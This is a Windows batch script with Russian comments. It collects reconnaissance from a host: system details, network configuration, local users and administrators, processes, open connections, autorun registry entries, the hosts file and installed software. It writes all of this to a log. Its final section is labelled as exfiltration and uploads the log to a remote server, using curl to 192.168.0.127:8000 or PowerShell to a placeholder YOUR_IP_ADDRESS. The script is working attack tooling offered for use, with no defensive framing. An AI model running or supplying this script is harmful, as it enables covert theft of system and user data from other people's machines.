@echo off
rem *** Скрипт для сбора системной информации ***

set "LOGFILE=%TEMP%\system_info_%COMPUTERNAME%_%DATE:~-4,4%%DATE:~-7,2%%DATE:~-10,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%.txt"

echo Отчет по системной информации для %COMPUTERNAME% от %DATE% %TIME% > "%LOGFILE%"
echo. >> "%LOGFILE%"

echo ==================================== >> "%LOGFILE%"
echo 1. Общая информация о системе: >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
systeminfo >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"

echo ==================================== >> "%LOGFILE%"
echo 2. Информация о сети (IP, MAC, DNS): >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
ipconfig /all >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"

echo ==================================== >> "%LOGFILE%"
echo 3. Пользователи и группы: >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
echo --- Локальные пользователи --- >> "%LOGFILE%"
net user >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"
echo --- Пользователи в группе Администраторы --- >> "%LOGFILE%"
net localgroup Administrators >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"
echo --- Текущий пользователь --- >> "%LOGFILE%"
whoami >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"

echo ==================================== >> "%LOGFILE%"
echo 4. Запущенные процессы: >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
tasklist >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"

echo ==================================== >> "%LOGFILE%"
echo 5. Активные сетевые подключения: >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
netstat -ano >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"

echo ==================================== >> "%LOGFILE%"
echo 6. Записи автозапуска (из реестра): >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run >> "%LOGFILE%" 2>&1
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"

echo ==================================== >> "%LOGFILE%"
echo 7. Содержимое файла hosts: >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
type C:\Windows\System32\drivers\etc\hosts >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"

echo ==================================== >> "%LOGFILE%"
echo 8. Список установленных программ (через PowerShell): >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
powershell "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize" >> "%LOGFILE%" 2>&1
powershell "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize" >> "%LOGFILE%" 2>&1
echo. >> "%LOGFILE%"

rem *** Поиск потенциально интересных файлов (осторожно, может быть очень много) ***
rem Эта часть может сильно замедлить выполнение и создать большой файл.
rem Можно ограничиться поиском в "Документах" или "Рабочем столе".
echo ==================================== >> "%LOGFILE%"
echo 9. Поиск файлов в папке Документы (doc, xls, pdf): >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
rem powershell "Get-ChildItem -Path '%USERPROFILE%\Documents' -Include '*.doc','*.docx','*.xls','*.xlsx','*.pdf' -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length | Format-Table -AutoSize" >> "%LOGFILE%" 2>&1
echo (Функция поиска файлов закомментирована, чтобы избежать создания слишком большого лога. Раскомментируйте, если нужно.) >> "%LOGFILE%"
echo. >> "%LOGFILE%"

echo Сбор информации завершен. Лог-файл находится по адресу: "%LOGFILE%"
exit

rem *** Эксфильтрация данных на удаленный HTTP-сервер ***
rem Замените http://YOUR_IP_ADDRESS:8000/ на адрес вашего сервера-приемника.
rem Если на целевой машине нет curl, будет использован PowerShell.

echo. >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"
echo 10. Попытка эксфильтрации лог-файла через HTTP: >> "%LOGFILE%"
echo ==================================== >> "%LOGFILE%"

rem Проверка наличия curl
where /Q curl
if %errorlevel% equ 0 (
    echo Обнаружен curl. Попытка загрузки файла... >> "%LOGFILE%"
    curl -X POST -F "file=@\"%LOGFILE%\"" http://192.168.0.127:8000/ >> "%LOGFILE%" 2>&1
    echo Эксфильтрация через curl завершена. >> "%LOGFILE%"
) else (
    echo curl не найден. Попытка через PowerShell. >> "%LOGFILE%"
    powershell -Command "$filePath = '%LOGFILE%'; $uri = 'http://YOUR_IP_ADDRESS:8000/'; Invoke-RestMethod -Uri $uri -Method Post -InFile $filePath" >> "%LOGFILE%" 2>&1
    echo Эксфильтрация через PowerShell завершена. >> "%LOGFILE%"
)
echo. >> "%LOGFILE%"

